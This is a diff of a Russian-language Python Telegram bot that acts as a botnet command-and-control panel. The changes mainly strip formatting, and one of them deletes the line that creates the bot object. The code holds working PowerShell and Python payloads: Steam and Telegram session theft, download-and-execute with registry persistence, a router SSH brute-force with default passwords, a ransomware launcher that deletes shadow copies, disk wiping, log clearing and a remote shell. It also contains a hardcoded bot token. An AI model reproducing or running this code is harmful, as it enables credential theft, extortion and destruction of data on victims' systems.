@@ -2,15 +2,14 @@
 # bot.py — для BotHost (bot-hosting.ru)
 # Загрузите этот файл в корень проекта бота.
 
-import telebot, json, time, base64, os, re, subprocess
+import telebot, json, time, base64, os, re, random, string, subprocess
 
 TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")  # или вставьте токен напрямую
 ADMIN_ID = 6099860667  # ваш числовой Telegram ID
 
-bot = telebot.TeleBot(TOKEN)
-agents = {}      # {chat_id: {hostname, os, ip, intensity, status}}
-selected = {}    # {admin_id: chat_id}
-pending = {}     # {admin_id: {cmd, target, token, expires}}
+agents = {}
+selected = {}
+pending = {}
 
 def is_admin(uid): return uid == ADMIN_ID
 
@@ -49,23 +48,24 @@ def help_cmd(msg):
     if not is_admin(msg.from_user.id):
         bot.reply_to(msg, f"Ваш ID: {msg.from_user.id}. Нет доступа.")
         return
+    # БЕЗ parse_mode — обычный текст
     bot.reply_to(msg, """
-🔧 **Команды управления:**
-/clients — список агентов
-/select <id> — выбрать цель
-/runkit <id|all> <модуль> — запустить модуль
-/autorun <id|all> <url> — загрузить и запустить EXE
-/scan_network — сканировать сеть
-/infect_routers — заразить роутеры
-/miner_power <id|all> <0-100> — мощность майнера
-/miner_stop <id|all> — остановить майнер
-/ransomware — шифровальщик (подтверждение)
-/kill — удалить агента (подтверждение)
-/wipe — стереть всё (подтверждение)
-/cover_tracks — замести следы
-/screenshot — скриншот
-/shell <команда> — выполнить команду
-""", parse_mode="Markdown")
+Команды управления:
+/clients - список агентов
+/select <id> - выбрать цель
+/runkit <id|all> <модуль> - запустить модуль
+/autorun <id|all> <url> - загрузить EXE
+/scan_network - сканировать сеть
+/infect_routers - заразить роутеры
+/miner_power <id|all> <0-100> - мощность майнера
+/miner_stop <id|all> - остановить майнер
+/ransomware - шифровальщик
+/kill - удалить агента
+/wipe - стереть всё
+/cover_tracks - замести следы
+/screenshot - скриншот
+/shell <команда> - выполнить команду
+""")
 
 @bot.message_handler(commands=['clients'])
 def clients_cmd(msg):
@@ -73,11 +73,11 @@ def clients_cmd(msg):
     if not agents:
         bot.reply_to(msg, "Нет подключённых агентов")
         return
-    txt = "🖥 **Агенты:**\n\n"
+    text = "Агенты:\n\n"
     for cid, info in agents.items():
-        sel = " ⭐" if selected.get(msg.from_user.id) == cid else ""
-        txt += f"`{cid}` | {info['hostname']} | {info['os']} | Мощность: {info.get('intensity','?')}%{sel}\n"
-    bot.reply_to(msg, txt, parse_mode="Markdown")
+        sel = " (выбран)" if selected.get(msg.from_user.id) == cid else ""
+        text += f"{cid} | {info['hostname']} | {info['os']} | Мощность: {info.get('intensity','?')}%{sel}\n"
+    bot.reply_to(msg, text)
 
 @bot.message_handler(commands=['select'])
 def select_cmd(msg):
@@ -90,13 +90,13 @@ def select_cmd(msg):
         cid = int(parts[1])
         if cid in agents:
             selected[msg.from_user.id] = cid
-            bot.reply_to(msg, f"🎯 Цель: {agents[cid]['hostname']}")
+            bot.reply_to(msg, f"Цель: {agents[cid]['hostname']}")
         else:
             bot.reply_to(msg, "Агент не найден")
     except:
         bot.reply_to(msg, "Некорректный ID")
 
-# ==================== МОДУЛИ (RUNKIT) ====================
+# ==================== МОДУЛИ ====================
 STEAL_MODULES = {
     "steal_steam": r'POWERSHELL: $steam=@("$env:PROGRAMFILES\Steam","$env:PROGRAMFILES(X86)\Steam","C:\Steam")|?{Test-Path $_}|select -First 1; if($steam){$d="$env:TEMP\steam";New-Item -ItemType Directory $d -Force|Out-Null; Copy-Item "$steam\config\loginusers.vdf","$steam\config\config.vdf","$steam\ssfn*","$steam\userdata" $d -Recurse -Force; Compress-Archive $d "$env:TEMP\steam.zip" -Force; Remove-Item $d -Recurse -Force}',
     "steal_telegram": r'POWERSHELL: $tg="$env:APPDATA\Telegram Desktop\tdata"; if(Test-Path $tg){taskkill /f /im telegram.exe 2>$null; Sleep 2; Compress-Archive $tg "$env:TEMP\tg_session.zip" -Force}',
@@ -134,13 +134,13 @@ def runkit_cmd(msg):
     cmd = STEAL_MODULES[mod]
     if target_spec == "all":
         broadcast(cmd)
-        bot.reply_to(msg, f"🚀 Модуль `{mod}` запущен на всех")
+        bot.reply_to(msg, f"Модуль {mod} запущен на всех")
     else:
         try:
             cid = int(target_spec)
             if cid in agents:
                 send_exec(cid, cmd)
-                bot.reply_to(msg, f"🚀 Модуль `{mod}` запущен на {agents[cid]['hostname']}")
+                bot.reply_to(msg, f"Модуль {mod} запущен на {agents[cid]['hostname']}")
             else:
                 bot.reply_to(msg, "Агент не найден")
         except:
@@ -158,13 +158,13 @@ def autorun_cmd(msg):
     cmd = f'POWERSHELL: $n=[IO.Path]::GetFileNameWithoutExtension("{url}")+".exe"; $d="C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\$n"; (New-Object Net.WebClient).DownloadFile("{url}",$d); attrib +s +h $d; New-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name $n -Value $d -Force; Start-Process $d -WindowStyle Hidden'
     if target_spec == "all":
         broadcast(cmd)
-        bot.reply_to(msg, f"📥 Загрузка на всех: {url}")
+        bot.reply_to(msg, f"Загрузка на всех: {url}")
     else:
         try:
             cid = int(target_spec)
             if cid in agents:
                 send_exec(cid, cmd)
-                bot.reply_to(msg, f"📥 Загрузка на {agents[cid]['hostname']}")
+                bot.reply_to(msg, f"Загрузка на {agents[cid]['hostname']}")
             else:
                 bot.reply_to(msg, "Агент не найден")
         except:
@@ -179,7 +179,7 @@ def scan_network_cmd(msg):
         return
     cmd = r'PYTHON: import subprocess,json,re,socket,base64,os,platform; out=subprocess.check_output("arp -a",shell=True).decode(); res={{"routers":[],"devices":[],"subnet":""}}; [res["devices"].append({{"ip":m.group(1),"mac":m.group(2)}}) for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:-]+)",out)]; print("NETMAP:"+base64.b64encode(json.dumps(res).encode()).decode())'
     send_exec(t, cmd)
-    bot.reply_to(msg, f"🔍 Сканирование сети на {agents[t]['hostname']}")
+    bot.reply_to(msg, f"Сканирование сети на {agents[t]['hostname']}")
 
 @bot.message_handler(commands=['infect_routers'])
 def infect_routers_cmd(msg):
@@ -191,9 +191,8 @@ def infect_routers_cmd(msg):
     creds = str([("root","admin"),("admin","admin"),("admin","password")])
     cmd = f'PYTHON: import paramiko,socket,json,base64,subprocess,time; creds={creds}; results={{"infected":[]}}; [results["infected"].append({{"ip":ip,"user":u,"pass":p}}) for ip in [f"192.168.1.\\{{i}}" for i in range(1,254)] for u,p in creds if (lambda s: (s.connect_ex((ip,22))==0 and (s.close() or True)))(socket.socket()) and (lambda ssh: (ssh.connect(ip,22,u,p,timeout=5,banner_timeout=5) or True) and (ssh.exec_command("echo backdoor") or True) and ssh.close())(paramiko.SSHClient())]; print("ROUTER_INFECT:"+base64.b64encode(json.dumps(results).encode()).decode())'
     kb = confirm_kb(msg.from_user.id, "infect_routers", t, cmd)
-    bot.reply_to(msg, f"🦠 Заразить роутеры на {agents[t]['hostname']}?", reply_markup=kb)
+    bot.reply_to(msg, f"Заразить роутеры на {agents[t]['hostname']}?", reply_markup=kb)
 
-# ==================== МАЙНЕР ====================
 @bot.message_handler(commands=['miner_power'])
 def miner_power_cmd(msg):
     if not is_admin(msg.from_user.id): return
@@ -214,14 +213,14 @@ def miner_power_cmd(msg):
         for cid in agents:
             if send_exec(cid, cmd):
                 agents[cid]['intensity'] = intensity
-        bot.reply_to(msg, f"⛏ Мощность {intensity}% для всех")
+        bot.reply_to(msg, f"Мощность {intensity}% для всех")
     else:
         try:
             cid = int(target_spec)
             if cid in agents:
                 if send_exec(cid, cmd):
                     agents[cid]['intensity'] = intensity
-                    bot.reply_to(msg, f"⛏ Мощность {intensity}% для {agents[cid]['hostname']}")
+                    bot.reply_to(msg, f"Мощность {intensity}% для {agents[cid]['hostname']}")
                 else:
                     bot.reply_to(msg, "Ошибка отправки")
             else:
@@ -242,20 +241,19 @@ def miner_stop_cmd(msg):
         for cid in agents:
             send_exec(cid, cmd)
             agents[cid]['intensity'] = 0
-        bot.reply_to(msg, "⛔ Майнер остановлен на всех")
+        bot.reply_to(msg, "Майнер остановлен на всех")
     else:
         try:
             cid = int(target_spec)
             if cid in agents:
                 send_exec(cid, cmd)
                 agents[cid]['intensity'] = 0
-                bot.reply_to(msg, f"⛔ Майнер остановлен на {agents[cid]['hostname']}")
+                bot.reply_to(msg, f"Майнер остановлен на {agents[cid]['hostname']}")
             else:
                 bot.reply_to(msg, "Агент не найден")
         except:
             bot.reply_to(msg, "Некорректный ID")
 
-# ==================== ОПАСНЫЕ КОМАНДЫ ====================
 @bot.message_handler(commands=['ransomware'])
 def ransomware_cmd(msg):
     if not is_admin(msg.from_user.id): return
@@ -263,7 +261,7 @@ def ransomware_cmd(msg):
     if not t: bot.reply_to(msg, "Нет целей"); return
     cmd = 'POWERSHELL: $wc=New-Object Net.WebClient; $wc.DownloadFile("https://github.com/goliate/hidden-tear/raw/master/hidden-tear.exe","C:\\Windows\\Help\\Windows\\en-US\\ransom.exe"); Start-Process "C:\\Windows\\Help\\Windows\\en-US\\ransom.exe" -WindowStyle Hidden; vssadmin delete shadows /all /quiet; bcdedit /set {default} recoveryenabled No'
     kb = confirm_kb(msg.from_user.id, "ransomware", t, cmd)
-    bot.reply_to(msg, f"🔐 Шифровальщик на {agents[t]['hostname']}?", reply_markup=kb)
+    bot.reply_to(msg, f"Шифровальщик на {agents[t]['hostname']}?", reply_markup=kb)
 
 @bot.message_handler(commands=['kill'])
 def kill_cmd(msg):
@@ -272,7 +270,7 @@ def kill_cmd(msg):
     if not t: bot.reply_to(msg, "Нет целей"); return
     cmd = 'POWERSHELL: Remove-Item C:\\Windows\\System32\\wbem\\wmiprvse.exe,C:\\Windows\\SysWOW64\\msiexec.exe,C:\\Windows\\Help\\Windows\\en-US\\help.exe -Force; reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /f; schtasks /delete /tn "WinUpdateCore" /f; BASH: rm -rf /usr/lib/systemd/systemd-networkd /usr/lib/apt/apt-helper; crontab -r; systemctl --user disable dbus 2>/dev/null'
     kb = confirm_kb(msg.from_user.id, "kill", t, cmd)
-    bot.reply_to(msg, f"🗑 Удалить агента с {agents[t]['hostname']}?", reply_markup=kb)
+    bot.reply_to(msg, f"Удалить агента с {agents[t]['hostname']}?", reply_markup=kb)
 
 @bot.message_handler(commands=['wipe'])
 def wipe_cmd(msg):
@@ -281,7 +279,7 @@ def wipe_cmd(msg):
     if not t: bot.reply_to(msg, "Нет целей"); return
     cmd = 'POWERSHELL: $d=Get-Disk 0; for($i=0;$i -lt 7;$i++){$d.Clear(0,$d.Size)}; $d|Clear-Disk -RemoveData -RemoveOEM -Confirm:$false; wevtutil el|%{wevtutil cl $_}; bcdedit /delete {current} /f; shutdown /s /f /t 0; BASH: shred -vfz -n 7 /dev/sda; rm -rf /var/log/* /tmp/* ~/.bash_history; echo c>/proc/sysrq-trigger'
     kb = confirm_kb(msg.from_user.id, "wipe", t, cmd)
-    bot.reply_to(msg, f"🧨 Wipe на {agents[t]['hostname']}?", reply_markup=kb)
+    bot.reply_to(msg, f"Wipe на {agents[t]['hostname']}?", reply_markup=kb)
 
 @bot.message_handler(commands=['cover_tracks'])
 def cover_tracks_cmd(msg):
@@ -289,7 +287,7 @@ def cover_tracks_cmd(msg):
     t = auto_target(msg.from_user.id)
     if not t: bot.reply_to(msg, "Нет целей"); return
     send_exec(t, STEAL_MODULES["cover_tracks"])
-    bot.reply_to(msg, f"🧹 Следы заметены на {agents[t]['hostname']}")
+    bot.reply_to(msg, f"Следы заметены на {agents[t]['hostname']}")
 
 @bot.message_handler(commands=['screenshot'])
 def screenshot_cmd(msg):
@@ -297,7 +295,7 @@ def screenshot_cmd(msg):
     t = auto_target(msg.from_user.id)
     if not t: bot.reply_to(msg, "Нет целей"); return
     send_exec(t, STEAL_MODULES["screenshot"])
-    bot.reply_to(msg, f"📸 Скриншот запрошен у {agents[t]['hostname']}")
+    bot.reply_to(msg, f"Скриншот запрошен у {agents[t]['hostname']}")
 
 @bot.message_handler(commands=['shell'])
 def shell_cmd(msg):
@@ -310,9 +308,9 @@ def shell_cmd(msg):
     if not t: bot.reply_to(msg, "Нет целей"); return
     cmd = f'POWERSHELL: {parts[1]} || BASH: {parts[1]}'
     send_exec(t, cmd)
-    bot.reply_to(msg, f"🔫 `{parts[1][:50]}` на {agents[t]['hostname']}")
+    bot.reply_to(msg, f"Выполнено: {parts[1][:50]} на {agents[t]['hostname']}")
 
-# ==================== ОБРАБОТКА РЕГИСТРАЦИИ ====================
+# ==================== РЕГИСТРАЦИЯ АГЕНТОВ ====================
 @bot.message_handler(func=lambda m: m.text and m.text.startswith("REG:"))
 def reg_agent(msg):
     try:
@@ -323,11 +321,11 @@ def reg_agent(msg):
             "os": data.get("os","?"),
             "ip": data.get("ip","?"),
             "intensity": 0,
-            "status": "🟢 Онлайн"
+            "status": "Онлайн"
         }
         if len(agents) == 1:
             selected[ADMIN_ID] = cid
-        bot.send_message(ADMIN_ID, f"🟢 Агент: {data.get('hostname')}")
+        bot.send_message(ADMIN_ID, f"Агент подключён: {data.get('hostname')}")
     except Exception as e:
         print(f"REG error: {e}")
 
@@ -341,13 +339,10 @@ def confirm_callback(call):
         return
     p = pending.pop(call.from_user.id)
     if call.data.startswith("x_"):
-        bot.edit_message_text("❌ Отменено", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text("Отменено", call.message.chat.id, call.message.message_id)
         return
     send_exec(p["target"], p["body"])
-    if p["target"] in agents:
-        bot.edit_message_text(f"✅ Выполнено: {p['cmd']}", call.message.chat.id, call.message.message_id)
-    else:
-        bot.edit_message_text("✅ Выполнено", call.message.chat.id, call.message.message_id)
+    bot.edit_message_text("Выполнено", call.message.chat.id, call.message.message_id)
 
 if __name__ == '__main__':
     print("Бот запущен")
